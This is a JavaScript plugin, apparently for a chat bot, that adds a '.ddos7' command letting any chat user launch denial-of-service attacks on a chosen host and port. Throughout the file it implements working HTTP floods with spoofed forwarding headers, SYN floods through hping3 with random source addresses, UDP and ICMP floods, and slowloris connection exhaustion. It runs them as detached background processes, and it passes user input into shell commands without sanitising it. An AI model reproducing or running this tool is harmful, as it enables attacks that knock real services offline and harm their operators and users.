import { spawn, exec } from "child_process";
import crypto from "crypto";
import fs from "fs";
import net from "net";
import dgram from "dgram";

const pluginConfig = {
    name: 'ddos7',
    alias: ['ddos', 'attack7', 'flood7'],
    category: 'tools',
    description: 'Multi-layer DDoS: http, syn, udp, icmp, slowloris',
    usage: '.ddos7 <type> <target> <port> <duration> <threads>',
    example: '.ddos7 http https://target.com 443 60 100',
    isOwner: false,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 15,
    energi: 15,
    isEnabled: true
};

// ========== ATTACK ENGINE ==========
class MultiLayerDDoS {
    constructor() {
        this.jobs = new Map();
    }

    // Layer 7 - HTTP/S Flood (with random headers)
    httpFlood(target, port, duration, threads) {
        const id = crypto.randomBytes(8).toString('hex');
        const script = `
            const http = require('http'), https = require('https');
            const url = new URL('${target}');
            const agent = new (url.protocol === 'https:' ? https : http).Agent({ keepAlive: true, maxSockets: 500 });
            const end = Date.now() + ${duration * 1000};
            const payload = 'A'.repeat(1024);
            const headers = () => ({
                'User-Agent': 'Mozilla/5.0 (${Math.random()>0.5?'Windows':'Mac'})',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': \`\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}\`
            });
            const req = () => {
                const opts = { hostname: url.hostname, port: ${port}, path: url.pathname || '/', method: 'GET', headers: headers(), agent };
                const r = (url.protocol === 'https:' ? https : http).request(opts, (res) => { res.destroy(); });
                r.on('error', () => {});
                r.write(payload);
                r.end();
            };
            for (let i=0; i<${threads}; i++) { setInterval(req, 50); }
        `;
        const child = spawn('node', ['-e', script], { detached: true, stdio: 'ignore', shell: true });
        child.unref();
        this.jobs.set(id, { process: child, target, type: 'http', started: Date.now() });
        return id;
    }

    // Layer 4 - SYN Flood (requires hping3)
    synFlood(target, port, duration, threads) {
        const id = crypto.randomBytes(8).toString('hex');
        const cmd = `timeout ${duration}s hping3 -S -p ${port} -i u100 --flood --rand-source ${target} 2>/dev/null`;
        const child = exec(cmd, { detached: true, stdio: 'ignore' });
        child.unref();
        this.jobs.set(id, { process: child, target, type: 'syn', started: Date.now() });
        return id;
    }

    // Layer 3/4 - UDP Flood (pure Node)
    udpFlood(target, port, duration, threads) {
        const id = crypto.randomBytes(8).toString('hex');
        const script = `
            const dgram = require('dgram');
            const end = Date.now() + ${duration * 1000};
            const payload = Buffer.alloc(65507, 'X');
            const send = () => {
                const sock = dgram.createSocket('udp4');
                sock.send(payload, 0, payload.length, ${port}, '${target}', () => sock.close());
            };
            for (let i=0; i<${threads}; i++) { setInterval(send, 10); }
        `;
        const child = spawn('node', ['-e', script], { detached: true, stdio: 'ignore', shell: true });
        child.unref();
        this.jobs.set(id, { process: child, target, type: 'udp', started: Date.now() });
        return id;
    }

    // Layer 3 - ICMP Flood (requires ping -f)
    icmpFlood(target, duration, threads) {
        const id = crypto.randomBytes(8).toString('hex');
        const cmd = `timeout ${duration}s ping -f -i 0.1 -s 65507 ${target} 2>/dev/null`;
        const child = exec(cmd, { detached: true, stdio: 'ignore' });
        child.unref();
        this.jobs.set(id, { process: child, target, type: 'icmp', started: Date.now() });
        return id;
    }

    // Layer 7 - Slowloris (connection saturation)
    slowloris(target, port, duration, threads) {
        const id = crypto.randomBytes(8).toString('hex');
        const script = `
            const net = require('net');
            const end = Date.now() + ${duration * 1000};
            const create = () => {
                const sock = net.createConnection({ host: '${target}', port: ${port} });
                sock.on('connect', () => { sock.write('GET / HTTP/1.1\\r\\nHost: ${target}\\r\\n'); });
                sock.on('error', () => {});
                setTimeout(() => { try { sock.destroy(); } catch(e) {} }, 5000);
            };
            for (let i=0; i<${threads}; i++) { setInterval(create, 100); }
        `;
        const child = spawn('node', ['-e', script], { detached: true, stdio: 'ignore', shell: true });
        child.unref();
        this.jobs.set(id, { process: child, target, type: 'slowloris', started: Date.now() });
        return id;
    }

    stop(id) {
        if (this.jobs.has(id)) {
            const job = this.jobs.get(id);
            try { process.kill(-job.process.pid); } catch(e) { job.process.kill('SIGKILL'); }
            this.jobs.delete(id);
            return true;
        }
        return false;
    }

    list() {
        return Array.from(this.jobs.entries()).map(([id, j]) => ({ id, target: j.target, type: j.type, pid: j.process.pid }));
    }
}

const engine = new MultiLayerDDoS();

// ========== HANDLER ==========
async function handler(m, { sock, text }) {
    if (!text) {
        return m.reply(
            `🔥 *DDOS 7 LAYER*\n` +
            `.ddos7 <type> <target> <port> <duration> <threads>\n` +
            `Types: http, syn, udp, icmp, slowloris\n` +
            `Ex: .ddos7 http https://example.com 443 30 50\n` +
            `.ddos7 stop <id> | .ddos7 list`
        );
    }
    try {
        await m.react('🕕');
        const args = text.trim().split(/\s+/);
        const cmd = args[0].toLowerCase();

        if (cmd === 'stop' && args.length === 2) {
            const result = engine.stop(args[1]);
            await m.react(result ? '✅' : '❌');
            return m.reply(result ? `Stopped ${args[1]}` : `ID ${args[1]} not found`);
        }

        if (cmd === 'list') {
            const list = engine.list();
            return m.reply(list.length ? list.map(l => `${l.id} | ${l.type} -> ${l.target} (PID:${l.pid})`).join('\n') : 'No active');
        }

        if (['http','syn','udp','icmp','slowloris'].includes(cmd) && args.length === 6) {
            const type = cmd;
            const target = args[1];
            const port = parseInt(args[2]);
            const duration = parseInt(args[3]);
            const threads = parseInt(args[4]);
            if (!target || isNaN(port) || isNaN(duration) || isNaN(threads) || port<1 || port>65535 || duration<1 || threads<1) {
                await m.react('❌');
                return m.reply('Parameter: target, port (1-65535), duration(detik), threads(>0).');
            }

            let id = null;
            switch(type) {
                case 'http': id = engine.httpFlood(target, port, duration, threads); break;
                case 'syn': id = engine.synFlood(target, port, duration, threads); break;
                case 'udp': id = engine.udpFlood(target, port, duration, threads); break;
                case 'icmp': id = engine.icmpFlood(target, duration, threads); break;
                case 'slowloris': id = engine.slowloris(target, port, duration, threads); break;
            }
            await m.react('🔥');
            return m.reply(`✅ ${type.toUpperCase()} attack launched. ID: ${id} | Target: ${target}:${port} | Dur: ${duration}s | Threads: ${threads}`);
        }

        await m.react('❓');
        return m.reply(`Gunakan: .ddos7 <http|syn|udp|icmp|slowloris> <target> <port> <duration> <threads>`);
    } catch(e) {
        await m.react('❌');
        return m.reply(`Error: ${e.message}`);
    }
}

export { pluginConfig as config, handler };